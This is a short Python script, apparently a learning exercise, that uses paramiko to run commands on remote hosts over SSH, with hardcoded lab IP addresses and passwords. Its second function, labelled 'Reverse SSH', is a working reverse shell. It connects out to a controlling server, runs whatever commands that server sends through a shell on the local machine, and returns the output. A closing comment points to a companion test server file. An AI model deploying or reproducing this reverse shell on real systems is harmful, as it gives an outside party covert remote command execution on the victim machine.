import threading
import sys
import paramiko
import subprocess

def ssh_command(ip,user,password,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=password)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024))
    return 
ssh_command('192.168.100.131','justin','lovepython','id')

#Reverse SSH (for window devices)
def ssh_command_reverse(ip,user,passw,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passw)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024))
        while True:
            command=ssh_session.recv(1024).decode()
            if command.lower()=="exit":
                break
            try:
                output=subprocess.check_output(command,shell=True)
                ssh_session.send(output)
            except:
                ssh_session.send(b"Command execution failed")
            finally:
                continue
            client.close()
    
    return

ssh_command_reverse('192.168.121.138','justin','mypassword','ClientConnected')
# I have created a SSH server through which we can test our connection in the file called SSH_server.py



